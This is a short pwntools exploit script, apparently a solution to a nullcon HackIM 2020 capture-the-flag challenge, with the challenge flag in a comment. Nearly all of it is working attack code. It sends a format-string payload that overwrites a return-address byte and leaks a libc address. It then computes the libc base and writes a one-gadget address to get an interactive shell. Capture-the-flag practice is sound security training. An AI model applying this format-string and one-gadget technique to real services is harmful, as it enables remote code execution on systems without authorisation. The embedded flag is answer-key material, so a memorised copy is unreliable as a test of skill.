#!/usr/bin/env python
from pwn import *

# flag = hackim20{kids_say_the_darndest_things_its_time_we_pwn_them}
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
r = remote('pwn2.ctf.nullcon.net', 5003)
libc = ELF('./libc-2.23.so')

# modify ret address to 0x951 to read one more time
r.sendline('65490')
payload = '%78c%12$hhn>>%19$llx<<%50c'.ljust(48, '\0') + chr(0x58)
r.send(payload)

r.recvuntil('>>')
libc_base = int(r.recvuntil('<<')[:-2],16) - 0x20830
print hex(libc_base)

magic = libc_base + 0xf1147
r.send('A'*8*13 + p64(magic))
r.interactive()
